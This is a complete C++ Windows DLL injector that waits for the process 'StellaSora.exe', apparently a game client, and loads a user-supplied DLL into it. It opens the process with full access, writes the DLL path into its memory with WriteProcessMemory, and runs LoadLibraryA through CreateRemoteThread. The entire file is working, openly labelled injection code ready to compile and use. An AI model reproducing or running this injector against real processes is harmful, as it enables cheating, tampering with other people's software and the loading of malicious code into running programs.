#include <windows.h>
#include <tlhelp32.h> // Lowercase for MinGW compatibility
#include <iostream>
#include <string.h>

DWORD GetProcessByName(const char* lpProcessName)
{
    PROCESSENTRY32 ProcList {};
    ProcList.dwSize = sizeof(ProcList);

    // Create snapshot of running processes
    const HANDLE hProcList = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcList == INVALID_HANDLE_VALUE)
        return (DWORD)-1;

    if (!Process32First(hProcList, &ProcList)) {
        CloseHandle(hProcList);
        return (DWORD)-1;
    }

    // Loop through processes and compare names
    do {
        // Since ProcList.szExeFile is already a CHAR array in your build, 
        // we compare directly using _stricmp (case-insensitive)
        if (_stricmp(ProcList.szExeFile, lpProcessName) == 0) {
            DWORD dwPID = ProcList.th32ProcessID;
            CloseHandle(hProcList);
            return dwPID;
        }
    } while (Process32Next(hProcList, &ProcList));

    CloseHandle(hProcList);
    return (DWORD)-1;
}

int main(const int argc, char* argv[])
{
    char* lpDLLName;
    const char* lpProcessName = "StellaSora.exe";
    char lpFullDLLPath[MAX_PATH];

    if (argc == 2)
    {
        lpDLLName = argv[1];
    }
    else
    {
        printf("[HELP] inject.exe <dll full path>\n");
        return -1;
    }

    DWORD dwProcessID = (DWORD)-1;

    printf("Waiting for process: %s...\n", lpProcessName);

    // Block until the process is found
    while (dwProcessID == (DWORD)-1) {
        dwProcessID = GetProcessByName(lpProcessName);

        if (dwProcessID == (DWORD)-1) {
            Sleep(500);
        }
    }

    printf("Process %s found with ID: %lu\n", lpProcessName, dwProcessID);
    printf("[DLL Injector]\n");
    printf("Process : %s\n", lpProcessName);
    printf("Process ID : %i\n\n", (int)dwProcessID);

    // Resolve absolute path to the DLL
    const DWORD dwFullPathResult = GetFullPathNameA(lpDLLName, MAX_PATH, lpFullDLLPath, nullptr);
    if (dwFullPathResult == 0)
    {
        printf("Error: Could not resolve full path of DLL.\n");
        return -1;
    }

    // Open target process with necessary permissions
    const HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID);
    if (hTargetProcess == NULL)
    {
        printf("Error: Could not open target process (Access Denied?).\n");
        return -1;
    }

    printf("[PROCESS INJECTION]\n");
    printf("Process opened successfully.\n");

    // Allocate memory in target process for the DLL path string
    const LPVOID lpPathAddress = VirtualAllocEx(hTargetProcess, nullptr, strlen(lpFullDLLPath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (lpPathAddress == nullptr)
    {
        printf("Error: Memory allocation failed in target process.\n");
        CloseHandle(hTargetProcess);
        return -1;
    }

    printf("Memory allocated at 0x%p\n", lpPathAddress);

    // Write the DLL path into the allocated memory
    if (!WriteProcessMemory(hTargetProcess, lpPathAddress, lpFullDLLPath, strlen(lpFullDLLPath) + 1, nullptr))
    {
        printf("Error: Failed to write to process memory.\n");
        VirtualFreeEx(hTargetProcess, lpPathAddress, 0, MEM_RELEASE);
        CloseHandle(hTargetProcess);
        return -1;
    }

    printf("DLL path written successfully.\n");

    // Get address of LoadLibraryA from kernel32.dll
    const HMODULE hModule = GetModuleHandleA("kernel32.dll");
    const FARPROC lpFunctionAddress = GetProcAddress(hModule, "LoadLibraryA");
    
    if (lpFunctionAddress == nullptr)
    {
        printf("Error: Could not find LoadLibraryA address.\n");
        return -1;
    }

    printf("LoadLibraryA address at 0x%p\n", (void*)lpFunctionAddress);

    // Create remote thread to execute LoadLibraryA(lpPathAddress)
    const HANDLE hThread = CreateRemoteThread(hTargetProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)lpFunctionAddress, lpPathAddress, 0, nullptr);
    if (hThread == NULL)
    {
        printf("Error: Failed to create remote thread.\n");
        return -1;
    }

    WaitForSingleObject(hThread, INFINITE);
    
    printf("DLL Injected!\n");

    // Cleanup
    CloseHandle(hThread);
    CloseHandle(hTargetProcess);

    return 0;
}

